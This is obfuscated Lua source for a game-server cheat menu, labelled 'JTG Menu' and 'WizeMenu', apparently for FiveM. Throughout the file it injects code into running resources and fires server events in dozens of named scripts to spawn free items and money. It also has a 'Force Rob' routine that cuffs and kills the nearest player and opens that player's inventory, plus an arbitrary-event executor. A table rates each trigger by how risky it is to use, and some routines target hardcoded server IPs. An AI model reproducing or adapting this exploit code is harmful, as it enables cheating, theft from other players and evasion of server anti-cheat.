                        ]] );end,["angelicxs-CivilianJobs"]=function() MachoInjectResource2(8 -5 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function safafawfaws()
                                TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            safafawfaws()
                        ]] );end,ars_whitewidow_v2=function() MachoInjectResource2(7 -4 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                    items = {
                                        {
                                            id = "]]   .. v226   .. [[",
                                            image = "JTG",
                                            name = "JTG",
                                            page = 1,
                                            price = 500,
                                            quantity = ]]   .. v227   .. [[,
                                            stock = 999999999999999999999999999,
                                            totalPrice = 0
                                        }
                                    },
                                    method = "cash",
                                    total = 0
                                }, "cash")
                            end

                            sDfjMawT34()
                        ]] );end,ars_cannabisstore_v2=function() MachoInjectResource2(2 + 1 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                                items = {
                                    {
                                        id = "]]   .. v226   .. [[",
                                        image = "JTG",
                                        name = "JTG",
                                        page = JTG,
                                        price = 0,
                                        quantity = ]]   .. v227   .. [[,
                                        stock = 10000000000000,
                                        totalPrice = 0
                                    }
                                },
                                method = "JTG",
                                total = 0
                            }, "cash")
                        end

                        sDfjMawT34()
                        ]] );end,ars_hunting=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent("ars_hunting:sellBuyItem",  {
                                    item = "]]   .. v226   .. [[",
                                    price = 1,
                                    quantity = ]]   .. v227   .. [[,
                                    buy = true
                                })
                            end

                            sDfjMawT34()
                        ]] );end,["boii-whitewidow"]=function() local v364=0;local v365;local v366;local v367;while true do if (v364==1) then function v366(v441) local v442=0 -0 ;while true do if ((0 -0)==v442) then for v459,v460 in ipairs(v365) do if (v441==v460) then return true;end end return false;end end end v367=GetCurrentServerEndpoint();v364=2 + 0 ;end if (v364==(0 -0)) then v365={"217.20.242.24:30120"};v366=nil;v364=2 -1 ;end if (v364==2) then if v366(v367) then MachoInjectResource2(6 -3 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function sDfjMawT34()
                                    TriggerServerEvent('boii-whitewidow:server:AddItem', ']]   .. v226   .. [[', ]]   .. v227   .. [[)
                                end

                                sDfjMawT34()
                            ]] );end break;end end end,["codewave-cannabis-cafe"]=function() local v368=0 + 0 ;local v369;local v370;local v371;while true do if (v368==(0 -0)) then v369={"185.244.106.45:30120"};v370=nil;v368=2 -1 ;end if (v368==1) then function v370(v443) local v444=1268 -(1249 + 19) ;while true do if (v444==(0 + 0)) then for v461,v462 in ipairs(v369) do if (v443==v462) then return true;end end return false;end end end v371=GetCurrentServerEndpoint();v368=7 -5 ;end if (2==v368) then if v370(v371) then MachoInjectResource2(1089 -(686 + 400) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function sDfjMawT34()
                                    TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]]   .. v226   .. [[", newItem = "JTG", pricePerItem = 0 }, ]]   .. v227   .. [[)
                                end

                                sDfjMawT34()
                            ]] );end break;end end end,["snipe-boombox"]=function() MachoInjectResource2(3 + 0 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent("snipe-boombox:server:pickup", ]]   .. v227   .. [[, vector3(0.0, 0.0, 0.0), "]]   .. v226   .. [[")
                            end

                            sDfjMawT34()
                        ]] );end,devkit_bbq=function() MachoInjectResource2(232 -(73 + 156) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent('devkit_bbq:addinv', ']]   .. v226   .. [[', ]]   .. v227   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end,mt_printers=function() MachoInjectResource2(1 + 2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[  
                            local function sDfjMawT34()
                                TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]]   .. v226   .. [[", "add")
                            end

                            sDfjMawT34()
                        ]] );end,WayTooCerti_3D_Printer=function() MachoInjectResource2(814 -(721 + 90) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[ 
                            local function ZxUwQsErTy12()
                                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']]   .. v226   .. [[', ]]   .. v227   .. [[)
                            end
                            ZxUwQsErTy12()
                        ]] );end,["pug-fishing"]=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function MnBvCxZlKjHgFd23()
                                TriggerServerEvent('Pug:server:GiveFish', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end
                            MnBvCxZlKjHgFd23()
                        ]] );end,apex_koi=function() MachoInjectResource2(1 + 2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function ErTyUiOpAsDfGh45()
                                TriggerServerEvent("apex_koi:client:addItem", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end
                            ErTyUiOpAsDfGh45()
                        ]] );end,apex_peckerwood=function() MachoInjectResource2(9 -6 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function UiOpAsDfGhJkLz67()
                                TriggerServerEvent("apex_peckerwood:client:addItem", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end
                            UiOpAsDfGhJkLz67()
                        ]] );end,apex_thetown=function() MachoInjectResource2(473 -(224 + 246) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function PlMnBvCxZaSdFg89()
                                TriggerServerEvent("apex_thetown:client:addItem", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end
                            PlMnBvCxZaSdFg89()
                        ]] );end,["codewave-bbq"]=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function QwErTyUiOpAsDf90()
                                for i = 1, ]]   .. v227   .. [[ do
                                    TriggerServerEvent('placeProp:returnItem', "]]   .. v226   .. [[")
                                    Wait(1)
                                end
                            end
                            QwErTyUiOpAsDf90()
                        ]] );end,brutal_hunting=function() MachoInjectResource2(4 -1 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function TyUiOpAsDfGhJk01()
                                Wait(1)
                                TriggerServerEvent("brutal_hunting:server:AddItem", {
                                    {
                                        amount = "]]   .. v227   .. [[",
                                        item = "]]   .. v226   .. [[",
                                        label = "J",
                                        price = 0
                                    }
                                })
                            end
                            TyUiOpAsDfGhJk01()
                        ]] );end,xmmx_bahamas=function() MachoInjectResource2(5 -2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function JkLzXcVbNmQwEr02()
                                TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]]   .. v226   .. [[", {
                                    amount = ]]   .. v227   .. [[,
                                    cash = {
                                    }
                                })
                            end
                            JkLzXcVbNmQwEr02()
                        ]] );end,ak47_drugmanager=function() local v372=0 + 0 ;local v373;local v374;local v375;while true do if (v372==(1 + 0)) then function v374(v445) for v451,v452 in ipairs(v373) do if (v445==v452) then return true;end end return false;end v375=GetCurrentServerEndpoint();v372=2 + 0 ;end if (v372==2) then if v374(v375) then MachoInjectResource2(5 -2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function aKf48SlWd()
                                    Wait(1)
                                    TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v226   .. [[", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                                end
                                aKf48SlWd()
                            ]] );end break;end if (v372==(0 -0)) then v373={"162.222.16.18:30120"};v374=nil;v372=1994 -(1238 + 755) ;end end end,xmmx_letscookplus=function() MachoInjectResource2(1 + 2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function QwErTy123()
                                Wait(1)
                                TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                                    totalCost = 0,
                                    cart = {
                                        {name = "]]   .. v226   .. [[", quantity = ]]   .. v227   .. [[}
                                    }
                                }, "bank")
                            end
                            QwErTy123()
                        ]] );end,["xmmx-letscamp"]=function() local v376=1534 -(709 + 825) ;local v377;local v378;local v379;while true do if (v376==0) then v377={"66.70.153.70:80"};v378=nil;v376=1 -0 ;end if (v376==(1 -0)) then function v378(v446) for v453,v454 in ipairs(v377) do if (v446==v454) then return true;end end return false;end v379=GetCurrentServerEndpoint();v376=2;end if (v376==2) then if  not v378(v379) then local v455=string.format([[ 
                                local function XcVbNm82()
                                    Wait(1)
                                    TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']]   .. v226   .. [[', {
                                        ["%s"] = {
                                            ['lccampherbs'] = 0,
                                            ['lccampmeat'] = 0,
                                            ['lccampbutta'] = 0
                                        },
                                        ['amount'] = ]]   .. v227   .. [[
                                    })
                                end
                                XcVbNm82()
                            ]] ,v226);MachoInjectResource2(3,"xmmx-letscamp",v455);end break;end end end,wasabi_mining=function() MachoInjectResource2(867 -(196 + 668) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function MzXnJqKs88()
                                local item = {
                                    difficulty = { "medium", "medium" },
                                    item = "]]   .. v226   .. [[",
                                    label = "JTG",
                                    price = { 110, 140 }
                                }

                                local index = 3
                                local amount = ]]   .. v227   .. [[

                                for i = 1, amount do
                                    Wait(1)
                                    TriggerServerEvent('wasabi_mining:mineRock', item, index)
                                end
                            end
                            MzXnJqKs88()
                        ]] );end,apex_bahama=function() local v380={"89.31.216.161:30120"};local function v381(v414) for v424,v425 in ipairs(v380) do if (v414==v425) then return true;end end return false;end local v382=GetCurrentServerEndpoint();if v381(v382) then MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function PlMnBv55()
                                    Wait(1)
                                    TriggerServerEvent("apex_bahama:client:addItem", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                                end
                                PlMnBv55()
                            ]] );end end,["jg-mechanic"]=function() local v383=0;local v384;local v385;local v386;while true do if (v383==1) then function v385(v447) local v448=0 -0 ;while true do if (v448==(833 -(171 + 662))) then for v463,v464 in ipairs(v384) do if (v447==v464) then return true;end end return false;end end end v386=GetCurrentServerEndpoint();v383=2;end if (v383==0) then v384={"91.190.154.43:30120"};v385=nil;v383=3 -2 ;end if (v383==(1 + 1)) then if v385(v386) then MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function HjKlYu89()
                                    Wait(1)
                                    TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v226   .. [[", 0, ]]   .. v227   .. [[, "autoexotic", 1)
                                end
                                HjKlYu89()
                            ]] );end break;end end end,["jg-mechanic"]=function() local v387={"191.96.152.17:30121"};local function v388(v415) local v416=0 -0 ;while true do if (v416==(0 + 0)) then for v456,v457 in ipairs(v387) do if (v415==v457) then return true;end end return false;end end end local v389=GetCurrentServerEndpoint();if v388(v389) then MachoInjectResource2(1489 -(35 + 1451) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                                local function LkJfQwOp78()
                                    Wait(1)
                                    TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v226   .. [[", 0, ]]   .. v227   .. [[, "TheCultMechShop", 1)
                                end
                                LkJfQwOp78()
                            ]] );end end};local v362=false;for v390,v391 in pairs(v361) do if (GetResourceState(v390)=="started") then v391();v362=true;break;end end if  not v362 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end break;end end end);MoneyInputBox=MachoMenuInputbox(v44[1455 -(28 + 1425) ],"Amount:","...");MachoMenuButton(v44[2],"Spawn Money",function() local v228=MachoMenuGetInputbox(MoneyInputBox);if (v228 and tonumber(v228)) then local v286=0;local v287;local v288;local v289;while true do if (v286==0) then v287=tonumber(v228);v288={["codewave-lashes-phone"]=function() MachoInjectResource2(1996 -(941 + 1052) ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardlashes', ]]   .. v287   .. [[)
                    ]] );end,["codewave-nails-phone"]=function() MachoInjectResource2(3,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardnails', ]]   .. v287   .. [[)
                    ]] );end,["codewave-caps-client-phone"]=function() MachoInjectResource2(3 + 0 ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardCaps', ]]   .. v287   .. [[)
                    ]] );end,["codewave-wigs-v3-phone"]=function() MachoInjectResource2(1517 -(822 + 692) ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardWigss', ]]   .. v287   .. [[)
                    ]] );end,["codewave-icebox-phone"]=function() MachoInjectResource2(3 -0 ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardiceboxs', ]]   .. v287   .. [[)
                    ]] );end,["codewave-sneaker-phone"]=function() MachoInjectResource2(2 + 1 ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardShoes', ]]   .. v287   .. [[)
                    ]] );end,["codewave-handbag-phone"]=function() MachoInjectResource2(300 -(45 + 252) ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardhandbags', ]]   .. v287   .. [[)
                    ]] );end};v286=1;end if (v286==(1 + 0)) then v289=false;for v392,v393 in pairs(v288) do if (GetResourceState(v392)=="started") then v393();v289=true;break;end end v286=2;end if (v286==2) then if  not v289 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end break;end end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");end end);local v66=MachoMenuInputbox(v44[2 + 2 ],"Event:","...");local v67=MachoMenuInputbox(v44[9 -5 ],"Type:","...");local v68=MachoMenuInputbox(v44[437 -(114 + 319) ],"Resource:","...");local v69={"monitor","any"};MachoMenuButton(v44[4 -0 ],"Execute",function() local v229=0 + 0 ;local v230;local v231;local v232;local v233;local v234;local v235;local v236;local v237;local v238;local v239;local v240;local v241;local v242;local v243;local v244;while true do if (5==v229) then if (v232 and (v232~="")) then if (GetResourceState(v232)=="started") then v244=v232;end else for v394,v395 in ipairs(v69) do if (GetResourceState(v395)=="started") then v244=v395;break;end end end if v244 then MachoInjectResource(v244,v243);end break;end if (v229==(1 -0)) then v233,v234=load("return function() return "   .. v230   .. " end" );if  not v233 then return;end v235,v236=pcall(v233);if ( not v235 or (type(v236)~="function")) then return;end v229=3 -1 ;end if ((1965 -(556 + 1407))==v229) then v237={pcall(v236)};if  not v237[1] then return;end v238=v237[467 -(170 + 295) ];v239={};v229=2 + 1 ;end if (v229==4) then for v339,v340 in ipairs(v239) do table.insert(v241,v240(v340));end v242=(( #v241>(0 + 0)) and table.concat(v241,", ")) or "" ;v243=string.format([[
                local event = %q
                local triggerType = string.lower(%q)
                local args = { %s }

                if triggerType == "server" then
                    TriggerServerEvent(event, table.unpack(args))
                else
                    TriggerEvent(event, table.unpack(args))
                end
            ]],tostring(v238),string.lower(v231 or "client" ),v242);v244=nil;v229=5;end if (v229==(0 -0)) then v230=MachoMenuGetInputbox(v66);v231=MachoMenuGetInputbox(v67);v232=MachoMenuGetInputbox(v68);if ( not v230 or (v230=="")) then return;end v229=1 + 0 ;end if ((2 + 1)==v229) then for v341=3, #v237 do table.insert(v239,v237[v341]);end v240=nil;function v240(v342) if (type(v342)=="string") then return string.format("%q",v342);elseif ((type(v342)=="number") or (type(v342)=="boolean")) then return tostring(v342);elseif (type(v342)=="table") then local v449,v450=pcall(function() return json.encode(v342);end);return (v449 and string.format("json.decode(%q)",v450)) or "nil" ;else return "nil";end end v241={};v229=3 + 1 ;end end end);local v70=1230 -(957 + 273) ;local v71={[0]={name="[E] Force Rob",resource=nil,code=nil}};MachoMenuDropDown(v44[1 + 2 ],"Exploit Choice",function(v245) v70=v245;end,v71[0].name);MachoMenuButton(v44[2 + 1 ],"Execute",function() local v246=v71[v70];if  not v246 then return;end if (v70==(0 -0)) then local v290=0 -0 ;local v291;local v292;local v293;while true do if (v290==(2 -1)) then v293={ox="ox_inventory",qb="qb-inventory"};for v396,v397 in pairs(v293) do if (GetResourceState(v397)=="started") then v291=v396;break;end end v290=9 -7 ;end if (v290==(1780 -(389 + 1391))) then v291=nil;v292={"ox_inventory","ox_doorlock","ox_fuel","ox_target","ox_lib","ox_sit","ox_appearance"};v290=312 -(309 + 2) ;end if (2==v290) then for v398,v399 in ipairs(v292 or {} ) do if (GetResourceState(v399)=="started") then MachoInjectResource2(9 -6 ,v399,([[
                            local function awt72q48dsgn()
                                local awgfh347gedhs = CreateThread
                                awgfh347gedhs(function()
                                    local dict = 'missminuteman_1ig_2'
                                    local anim = 'handsup_enter'

                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do
                                        Wait(0)
                                    end

                                    while true do
                                        Wait(0)
                                        if IsDisabledControlJustPressed(0, 38) then
                                            local selfPed = PlayerPedId()
                                            local selfCoords = GetEntityCoords(selfPed)
                                            local closestPlayer = -1
                                            local closestDistance = -1

                                            for _, player in ipairs(GetActivePlayers()) do
                                                local targetPed = GetPlayerPed(player)
                                                if targetPed ~= selfPed then
                                                    local coords = GetEntityCoords(targetPed)
                                                    local dist = #(selfCoords - coords)
                                                    if closestDistance == -1 or dist < closestDistance then
                                                        closestDistance = dist
                                                        closestPlayer = player
                                                    end
                                                end
                                            end

                                            if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                                local ped = GetPlayerPed(closestPlayer)

                                                local CEPressPlayer = SetEnableHandcuffs
                                                local CEDeadPlayerCheck = SetEntityHealth

                                                if not IsPedCuffed(ped) then
                                                    CEPressPlayer(ped, true)
                                                    CEDeadPlayerCheck(ped, 0)
                                                    CEPressPlayer(ped, true)
                                                end

                                                if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                                    TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                                end
                                                
                                                local ActiveInventory = "%s"
                                                local serverId = GetPlayerServerId(closestPlayer)
                                                if ActiveInventory == "ox" then
                                                    TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                                elseif ActiveInventory == "qb" then
                                                    TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                                end
                                            end
                                        end
                                    end
                                end)
                            end

                            awt72q48dsgn()

                        ]]):format(v291));break;end end break;end end else MachoInjectResource2(3,v246.resource,v246.code);end end);ItemNameHandle=MachoMenuInputbox(v45[1],"Name:","...");ItemAmountHandle=MachoMenuInputbox(v45[1],"Amount:","...");local v72={turn=1213 -(1090 + 122) ,akIndex=1};local function v73(v247) MachoInjectResource("any",v247);end MachoMenuButton(v45[1 + 0 ],"Spawn Item",function() if  not v6() then return;end local v248=MachoMenuGetInputbox(ItemNameHandle);local v249=MachoMenuGetInputbox(ItemAmountHandle);if ( not v248 or (v248=="") or  not v249 or  not tonumber(v249)) then local v294=0 -0 ;while true do if (v294==(0 + 0)) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");return;end end end local v250=tonumber(v249);local v251={{id="ak_item",name="Any Item Trigger (SAFE)",type="item",res={"ak47_whitewidowv2","ak47_cannabiscafev2","ak47_khusland","ak47_khusbites","ak47_leafnlatte","ak47_qb_cannabiscafev2","ak47_qb_leafnlatte","ak47_qb_khusland","ak47_qb_khusbites","ak47_qb_whitewidowv2"},all=false},{id="nails_money",name="Money Trigger (SAFE)",type="money",res={"codewave-nails-phone"},all=true},{id="handbag_money",name="Money Trigger (SAFE)",type="money",res={"codewave-handbag-phone"},all=true},{id="sneaker_money",name="Money Trigger (SAFE)",type="money",res={"codewave-sneaker-phone"},all=true},{id="caps_money",name="Money Trigger (SAFE)",type="money",res={"codewave-caps-client-phone"},all=true},{id="generic_money",name="Any Item Trigger (Medium Risk)",type="item",res={"ak47_qb_drugmanagerv2","ak47_drugmanagerv2"},all=false},{id="hotdog_money",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=true},{id="ak47_inventory",name="Any Item Trigger (SAFE)",type="item",res={"ak47_inventory","ak47_qb_inventory"},all=false},{id="shop_purchase",name="Palm Beach ANY ITEM (SAFE)",type="item_only",res={"PalmBeachMiamiMinimap"},all=true},{id="cl_pizzeria",name="Any Item Trigger (Medium Risk)",type="item",res={"CL-Pizzeria"},all=false},{id="solstice_moonshine",name="Any Item Trigger (Medium Risk)",type="item",res={"SolsticeMoonshineV2"},all=false},{id="tk_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"Tk_smokev2"},all=false},{id="ox_cb_ws_sellshop",name="Any Item Trigger (High Risk)",type="item",res={"__ox_cb_ws_sellshop"},all=false},{id="adminplus_selldrugs",name="Any Event Trigger (High Risk)",type="event",res={"adminplus-selldrugs"},all=false},{id="ak47_drugmanager",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanager"},all=false},{id="ak47_drugmanagerv2",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanagerv2"},all=false},{id="ak47_prospecting_reward",name="Give Scrap Items (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak47_prospecting_sell",name="Money Trigger (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak4y_fishing del",name="Any Item Trigger (Medium Risk)",type="item",res={"ak4y-advancedFishing"},all=false},{id="ak4y_case_opening",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-caseOpening"},all=false},{id="ak4y_playtime_shop",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-playTimeShop"},all=false},{id="angelicxs_civilian_payment",name="Money Trigger (SAFE)",type="money",res={"angelicxs-civilianjobs"},all=false},{id="angelicxs_civilian_item",name="Any Item Trigger (SAFE)",type="item",res={"angelicxs-civilianjobs"},all=false},{id="apex_cluckinbell",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_cluckinbell"},all=false},{id="apex_rexdiner",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_rexdiner"},all=false},{id="ars_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_hunting"},all=false},{id="ars_vvsgrillz",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsgrillz_v2"},all=false},{id="ars_vvsguns",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsguns"},all=false},{id="ars_vvsjewelry",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsjewelry"},all=false},{id="ars_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_whitewidow_v2"},all=false},{id="av_business",name="Any Item Trigger (Medium Risk)",type="item",res={"av_business"},all=false},{id="boii_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-drugs"},all=false},{id="boii_moneylaunderer",name="Money Trigger (Medium Risk)",type="money",res={"boii-moneylaunderer"},all=false},{id="boii_pawnshop",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-pawnshop"},all=false},{id="boii_salvage_diving",name="Any Event Trigger (Medium Risk)",type="event",res={"boii-salavagediving"},all=false},{id="boii_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"boii_whitewidow"},all=false},{id="brutal_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_hunting"},all=false},{id="brutal_shop_robbery",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_shop_robbery"},all=false},{id="cfx_tcd_starter",name="Any Event Trigger (Medium Risk)",type="event",res={"cfx-tcd-starterpack"},all=false},{id="core_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"core_crafting"},all=false},{id="d3mba_heroin",name="Any Item Trigger (Medium Risk)",type="item",res={"d3MBA-heroin"},all=false},{id="dcweedroll",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedroll"},all=false},{id="dcweedrollnew",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedrollnew"},all=false},{id="devcore_needs",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_needs"},all=false},{id="devcore_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_smokev2"},all=false},{id="dusa_pets",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa-pets"},all=false},{id="dusa_pet_shop",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa_pet"},all=false},{id="dv_donut_delivery",name="Money Trigger (Medium Risk)",type="money",res={"dv-donutdeliveryjob"},all=false},{id="esx_weashop",name="Any Item Trigger (Medium Risk)",type="item",res={"esx_weashop"},all=false},{id="ez_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"ez_lib"},all=false},{id="fivecode_camping",name="Any Item Trigger (Medium Risk)",type="item",res={"fivecode_camping"},all=false},{id="food_mechanics",name="Any Item Trigger (Medium Risk)",type="item",res={"food_mechanics"},all=false},{id="forge_starter",name="Any Item Trigger (Medium Risk)",type="item",res={"forge-starter"},all=false},{id="fs_placeables",name="Any Item Trigger (Medium Risk)",type="item",res={"fs_placeables"},all=false},{id="fuksus_shops",name="Any Item Trigger (Medium Risk)",type="item",res={"fuksus-shops"},all=false},{id="gardener_job",name="Money Trigger (Medium Risk)",type="money",res={"gardenerjob"},all=false},{id="guatau_consumibles",name="Any Item Trigger (Medium Risk)",type="item",res={"guataubaconsumibles"},all=false},{id="hg_wheel",name="Any Item Trigger (Medium Risk)",type="item",res={"hg-wheel"},all=false},{id="horizon_payment",name="Any Item Trigger (Medium Risk)",type="item",res={"horizon_paymentsystem"},all=false},{id="complete_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"hunting"},all=false},{id="inside_fruitpicker",name="Money Trigger (Medium Risk)",type="money",res={"inside-fruitpicker"},all=false},{id="inverse_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"inverse-consumables"},all=false},{id="it_lib",name="Any Item Trigger (SAFE)",type="item",res={"it-lib"},all=false},{id="jg_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jg-mechanic"},all=false},{id="jim_bakery",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-bakery"},all=false},{id="jim_beanmachine",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-beanmachine"},all=false},{id="jim_burgershot",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-burgershot"},all=false},{id="jim_catcafe",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-catcafe"},all=false},{id="jim_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-consumables"},all=false},{id="jim_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mechanic"},all=false},{id="jim_mining",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mining"},all=false},{id="jim_pizzathis",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-pizzathis"},all=false},{id="jim_recycle",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-recycle"},all=false},{id="jim_shops_blackmarket",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="jim_shops_open",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="kaves_drugsv2",name="Any Item Trigger (Medium Risk)",type="item",res={"kaves_drugsv2"},all=false},{id="mt_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"mt-restaurants"},all=false},{id="mt_printers",name="Any Item Trigger (Medium Risk)",type="item",res={"mt_printers"},all=false},{id="nx_cayo",name="Any Item Trigger (Medium Risk)",type="item",res={"nx-cayo"},all=false},{id="okok_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"okokCrafting"},all=false},{id="pug_business_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-businesscreator"},all=false},{id="pug_chopping",name="Money Trigger (Medium Risk)",type="money",res={"pug-chopping"},all=false},{id="pug_fishing",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-fishing"},all=false},{id="pug_robbery_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-robberycreator"},all=false},{id="qb_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-crafting"},all=false},{id="qb_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-drugs"},all=false},{id="qb_garbage_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-garbagejob"},all=false},{id="qb_hotdog_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=false},{id="qb_recycle_job",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-recyclejob"},all=false},{id="qb_trash_search",name="Money Trigger (Medium Risk)",type="money",res={"qb-trashsearch"},all=false},{id="qb_warehouse",name="Money Trigger (Medium 